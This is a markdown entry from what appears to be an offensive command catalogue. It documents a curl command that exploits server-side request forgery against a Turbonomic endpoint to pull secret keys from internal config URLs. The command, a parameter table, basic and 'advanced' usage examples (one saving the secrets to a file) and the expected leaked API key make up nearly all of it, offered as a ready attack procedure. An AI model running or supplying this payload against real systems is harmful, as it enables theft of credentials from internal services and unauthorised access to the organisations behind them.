---
id: cmd-curl-secret-fetch
data: >-
  curl -X POST 'https://target.turbonomic.example.com/vulnerable-endpoint' -d
  '{"url":"http://localhost:8080/config/secrets"}' -H 'Content-Type:
  application/json'
tags:
  - secret-disclosure
  - ssrf
  - web
type: command
output: 'Config data with secrets, e.g., {"api_key": "sk-abc123"}'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.178Z'
verified: false
validated: true
submitted: true
---
# curl-secret-fetch

## Command

```bash
curl -X POST 'https://target.turbonomic.example.com/vulnerable-endpoint' -d '{"url":"http://localhost:8080/config/secrets"}' -H 'Content-Type: application/json'
```

## Description

This command exploits SSRF to fetch secret keys from an internal config endpoint in Turbonomic, leaking credentials in the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `'https://target...'` | Vulnerable endpoint | Yes |
| `-d '{...}'` | Payload with internal URL | Yes |
| `-H 'Content-Type...'` | Header for JSON | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.turbonomic.example.com/vulnerable-endpoint' -d '{"url":"http://localhost:8080/config/secrets"}' -H 'Content-Type: application/json'
```

### Advanced Usage

```bash
curl -X POST 'https://target.turbonomic.example.com/vulnerable-endpoint' -d '{"url":"http://127.0.0.1/secrets.json"}' -H 'Content-Type: application/json' --output secrets.json
```

## Expected Output

Raw config content including secret keys, parseable as JSON or text.

## Related

- [[Related Procedure|procedures/Extract-Secret-Keys-via-SSRF]]
